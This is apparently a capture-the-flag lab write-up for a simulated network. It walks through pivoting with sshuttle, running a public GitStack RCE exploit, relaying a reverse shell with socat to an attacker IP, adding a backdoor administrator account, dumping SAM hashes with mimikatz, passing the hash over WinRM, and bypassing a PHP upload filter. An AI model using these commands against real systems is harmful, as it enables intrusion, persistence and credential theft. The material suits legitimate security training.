# Getting access

In order to be able to connect to `10.200.177.150` from our machine, we use `sshuttle`.

```sh
sshuttle -r root@thomaswreath.thm --ssh-cmd "ssh -i root.prod-serv.ssh" 10.200.177.0/24 -x 10.200.177.200
```

Navigating to the web service on port 80, we're greeted with an error page.

It tells us this is a Django app with debug enabled, as well as several URLs to try. The main application page is `/gitstack` which is the git server mentioned by the client.

Checking for gitstack exploits with `searchsploit gitstack`, we have an unauthenticated RCE script `php/webapps/43777.py`. Running the exploit gives us a backdoor executing shell commands as `nt authority\system`.

By opening a port on `10.200.177.200` with `firewall-cmd --zone=public --add-port 17171/tcp`, we're able to get a reverse shell on `10.200.177.150`.

```sh
# attacker
socat tcp-l:1337 STDOUT

# 10.200.177.200
socat tcp:10.50.174.9:1337 tcp-l:17171,fork,reuseaddr

# Make a request to our backdoor on 10.200.177.150 with a powershell reverse shell aimed at 10.200.177.150:17171
```

With this, we have a shell as `nt authority\system`.

# Persistence

For persistence, as well as RDP and WinRM access, I created the user `chocola`.

```cmd
net user chocola PASSWORD /add
net localgroup Administrators chocola /add
net localgroup "Remote Management Users" chocola /add
```

With the newly created account, we can log into RDP and WinRM. Using RDP, we run `mimikatz` to get the administrator's password hash.

```sh
xfreerdp /v:git-serv /u:chocola /p:tset +clipboard /dynamic-resolution /drive:./shared,chocola
```

Running `cmd.exe` as Administrator, run `mimikatz`

```
# privilege::debug
# token::elevate
# lsadump::sam
```

With multiple password hashes dumped, we attempted to crack them and only got Thomas' password.

With the dumped hashes, we're able to perform pass-the-hash and log in as Administrator on WinRM.

# Git repository

Looking around the `git-serv` machine, we can find the source code of the page in `C:\GitStack\repositories\website1.git`, which we're able to easily download using WinRM. 

In `/resources/index.php`, we have file upload with some filters.

```php
	if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
		$target = "uploads/".basename($_FILES["file"]["name"]);
		$goodExts = ["jpg", "jpeg", "png", "gif"];
		if(file_exists($target)){
			header("location: ./?msg=Exists");
			die();
		}
		$size = getimagesize($_FILES["file"]["tmp_name"]);
		if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
			header("location: ./?msg=Fail");
			die();
		}
		move_uploaded_file($_FILES["file"]["tmp_name"], $target);	
		header("location: ./?msg=Success");
		die();
	} else if ($_SERVER["REQUEST_METHOD"] == "post"){
		header("location: ./?msg=Method");
	}
```

There are 2 filters in place: a file extension whitelist and a image file type check. Regarding the 1st filter, in line 9 of the code above, the file name is split on `.` and the 2nd item is checked against  a list of good extensions. This filter can easily be bypassed by having an extra extension in t he file name, for example `file.jpg.php` would pass the filter but still be a PHP file. As for the 2nd filter, it can be passed by uploading a legitimate image file with PHP code somewhere in the file.
